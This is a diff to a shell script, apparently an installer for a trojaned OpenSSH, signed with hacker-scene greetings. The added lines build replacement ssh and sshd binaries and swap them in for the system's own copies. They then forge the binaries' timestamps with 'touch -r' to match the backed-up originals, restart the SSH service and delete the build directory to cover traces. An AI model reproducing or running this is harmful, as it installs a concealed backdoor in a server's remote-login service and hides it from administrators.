@@ -3,6 +3,12 @@
 # - brazilian old school never dies
 #
 # greetz rfs r47 bonny mayhem all #darknet@efnet and #offset@brasnet old school members.
+# Modify By H1d3r
+
+
+
+export PATH=/sbin:/bin:/usr/sbin:/usr/bin:$PATH
+apt-get install -y libpam0g-dev libssl-dev gcc patch make
 
 
 if [ "$(whoami)" != "root" ]; then
@@ -234,6 +240,23 @@ mkdir ./backup-binaries
 # chattr -i /usr/bin/sshd
 cp /usr/bin/ssh ./backup-binaries/
 cp /usr/sbin/sshd ./backup-binaries/
+
+
+rm -rf /usr/sbin/sshd
+mkdir /var/empty
+chown root:root /var/empty
+cp ssh /usr/bin/
+cp sshd /usr/sbin/
+chmod +x /usr/sbin/sshd /usr/bin/ssh
+touch -r ./backup-binaries/ssh /usr/bin/ssh
+touch -r ./backup-binaries/sshd /usr/sbin/sshd
+echo "Restarting SSH."
+/etc/init.d/ssh restart &
+
+cd /usr/local/
+rm -rf openssh*
+/etc/init.d/ssh restart &
+
 
 # echo "**NOTE**"
 # echo "**NOTE** IF YOU CHANGED --PREFIX, YOU WILL NEED TO INSTALL BINARIES MANUALLY!!"
